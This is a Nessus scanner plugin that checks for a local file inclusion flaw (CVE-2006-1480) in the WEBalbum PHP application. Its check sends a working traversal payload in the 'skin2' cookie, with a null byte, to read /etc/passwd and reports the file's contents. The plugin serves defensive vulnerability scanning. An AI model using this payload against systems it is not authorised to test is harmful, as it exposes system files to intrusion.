#
# (C) Josh Zlatin-Amishav (josh at ramat dot cc)
# GPLv2
#

# Changes by Tenable:
# - Revised plugin title (4/10/2009)


include("compat.inc");

if (description) {
  script_id(21311);
  script_version("$Revision: 1.10 $");
  script_cve_id("CVE-2006-1480");
  script_bugtraq_id(17228);
  script_osvdb_id(24160);
  script_xref(name:"EDB-ID", value:"1608");

  script_name(english:"WEBalbum skin2 Cookie Parameter Traversal Local File Inclusion");
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by a
local file include vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host is running WEBalbum, a photo album application written
in PHP. 

The installed version of WEBalbum fails to sanitize user input to the
'skin2' cookie in 'inc/inc_main.php' before using it to include
arbitrary files.  An unauthenticated attacker may be able to read
arbitrary local files or include a local file that contains commands
which will be executed on the remote host subject to the privileges of
the web server process. 

This flaw is only exploitable if PHP's 'magic_quotes_gpc' is disabled." );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:H/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:W/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2006/05/03");
 script_set_attribute(attribute:"vuln_publication_date", value: "2006/03/25");
 script_cvs_date("$Date: 2015/09/24 23:21:22 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

 
  script_summary(english:"Checks for file includes in index.php");
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2015 Josh Zlatin-Amishav");

  script_dependencie("http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_keys("www/PHP");
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);

# Loop through CGI directories.
foreach dir (cgi_dirs()) {
  # Try to exploit the flaw in index.php to read /etc/passwd.
  req = string(
    "GET /index.php HTTP/1.0\r\n",
    "Host: ", get_host_name(), "\r\n",
    "Cookie: skin2=../../../../../../etc/passwd%00\r\n",
    "\r\n"
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if there's an entry for root
  if ( 'inc_main.php' >< res && egrep(pattern:"root:.*:0:[01]:", string:res) ) 
  {
    content = res - strstr(res, "<br />");

    report = string(
      "\n",
      "Here are the contents of the file '/etc/passwd' that\n",
      "Nessus was able to read from the remote host :\n",
      "\n",
      content, "\n"
    );

    security_warning(port:port, extra:report);
    exit(0);
  }
}
